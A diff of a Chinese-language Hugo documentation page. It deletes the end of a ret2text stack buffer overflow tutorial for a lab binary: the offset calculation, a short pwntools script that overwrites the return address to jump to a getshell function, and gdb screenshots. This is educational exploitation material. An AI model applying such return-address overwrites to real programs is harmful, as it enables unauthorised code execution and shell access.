@@ -5,7 +5,7 @@ lead: "Doks is a Hugo theme for building secure, fast, and SEO-ready documentati
 date: 2020-10-06T08:48:57+00:00
 lastmod: 2020-10-06T08:48:57+00:00
 draft: false
-images: []
+images: ["image-20230328234751184.png", "image-20230328234800253.png"]
 menu:
   docs:
     parent: "stackoverflow"
@@ -47,39 +47,3 @@ int main(){
 
 ![image-20230328234800253.png](image-20230328234800253.png)
 
-然后只需要将 `0x804849b` 写入函数返回地址即可，然后就是找buf变量到函数返回地址的偏移量
-
-![image-20230328234807546.png](image-20230328234807546.png)
-
-可以从main函数看出buf位于 `ebp-0x18` ，那么偏移量 = 0x18 + 4
-写一个python脚本来进行实现攻击，并gdb来看看效果
-
-```python
-from pwn import*
-context.terminal = ['tmux','splitw', '-h']
-o = process("./ret2text")
-payload = 'a'*(0x18 + 4) + p32(0x804849b)
-gdb.attach(o)
-o.sendline(payload)
-o.interactive()
-```
-
-在进行覆盖前栈内容为
-
-![image-20230328234815605.png](image-20230328234815605.png)
-
-覆盖后将变为
-
-![image-20230328234824023.png](image-20230328234824023.png)
-
-运行到ret看它的跳转方向
-
-![image-20230328235251121.png](image-20230328235251121.png)
-
-这个时候esp指向了getshell函数，即跳转去执行getshell函数
-
-![image-20230328234838338.png](image-20230328234838338.png)
-
-继续执行
-
-![image-20230328234843570.png](image-20230328234843570.png)
